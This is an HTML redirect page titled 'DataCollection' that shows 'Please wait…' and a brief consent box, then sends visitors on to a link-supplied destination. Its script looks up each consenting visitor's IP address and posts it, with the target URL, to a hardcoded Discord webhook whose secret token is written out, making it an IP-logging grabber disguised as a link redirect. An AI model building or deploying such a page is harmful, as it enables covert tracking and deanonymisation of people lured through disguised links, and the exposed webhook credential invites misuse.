<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DataCollection</title>
  <link rel="apple-touch-icon" href="/favicon.png">
  <link rel="icon" type="image/png" sizes="225x225" href="/favicon.png">
  <link rel="icon" href="/favicon.ico">
  <style>
    /* Body */
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e1e2f, #27293d);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    p {
      font-size: 1.5rem;
      margin-bottom: 20px;
    }

    /* AGB Overlay */
    #agbOverlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    #agbBox {
      background: #1f1f2e;
      padding: 25px 30px;
      border-radius: 12px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
      max-width: 450px;
      width: 90%;
      text-align: left;
      animation: fadeIn 0.5s ease-out;
    }

    #agbBox h2 {
      margin-top: 0;
      margin-bottom: 10px;
      font-size: 1.3rem;
      color: #f0f0f0;
    }

    #agbBox p {
      font-size: 0.95rem;
      line-height: 1.4;
      color: #ccc;
    }

    button {
      padding: 8px 18px;
      margin-top: 15px;
      margin-right: 10px;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    button:hover {
      opacity: 0.85;
      transform: scale(1.05);
    }

    #acceptBtn {
      background: #4caf50;
      color: #fff;
    }

    #declineBtn {
      background: #f44336;
      color: #fff;
    }

    @keyframes fadeIn {
      from {opacity:0; transform: translateY(20px);}
      to {opacity:1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <div>
    <p>Please wait…</p>
  </div>

  <div id="agbOverlay">
    <div id="agbBox">
      <h2>Terms and Conditions & Privacy Policy</h2>
      <p>This page processes technical data (e.g., IP address) to provide functionality. 
         By clicking "Accept", you consent to this processing. Click "Deny" to skip.</p>
      <button id="acceptBtn" onclick="acceptAgb()">Accept</button>
      <button id="declineBtn" onclick="declineAgb()">Deny</button>
    </div>
  </div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1457062530320171100/f-BBOUnVNOYYOfE5GWkZfnw75UcjWHG43IDMyMX-s5LXgYpMQgbY8cm4SZ7MdcL4ZZ3f";

// Zielseite aus Parameter oder Pfad
const params = new URLSearchParams(window.location.search);
let gotoAfter = params.get("gotoafter");
if (!gotoAfter) {
    const path = window.location.pathname.split("/").pop();
    if (path && path !== "index.html") {
        gotoAfter = "https://" + path;
    }
}
gotoAfter = gotoAfter || "https://t3102115-cmd.github.io";

// Cookie-Helfer
function setCookie(name, value, days = 365) {
    const d = new Date();
    d.setTime(d.getTime() + days*24*60*60*1000);
    document.cookie = `${name}=${value}; expires=${d.toUTCString()}; path=/`;
}
function getCookie(name) {
    return document.cookie.split("; ").find(row => row.startsWith(name + "="))?.split("=")[1];
}

// Weiterleitung
function redirect() {
    setTimeout(() => { window.location.href = gotoAfter; }, 1500);
}

// IP loggen
function logIp() {
    fetch("https://api.ipify.org?format=json")
        .then(r => r.json())
        .then(data => {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `Visitor accessed your site!\nIP: ${data.ip}\nGotoAfter: ${gotoAfter}`
                })
            });
        })
        .finally(redirect);
}

// AGB Aktionen
function acceptAgb() {
    setCookie("agb", "accepted");
    document.getElementById("agbOverlay").style.display = "none";
    logIp();
}

function declineAgb() {
    setCookie("agb", "declined");
    document.getElementById("agbOverlay").style.display = "none";
    redirect();
}

// Startlogik
const agbStatus = getCookie("agb");
if (agbStatus === "accepted") {
    logIp();
} else if (agbStatus === "declined") {
    redirect();
} else {
    document.getElementById("agbOverlay").style.display = "flex";
}
</script>
</body>
</html>
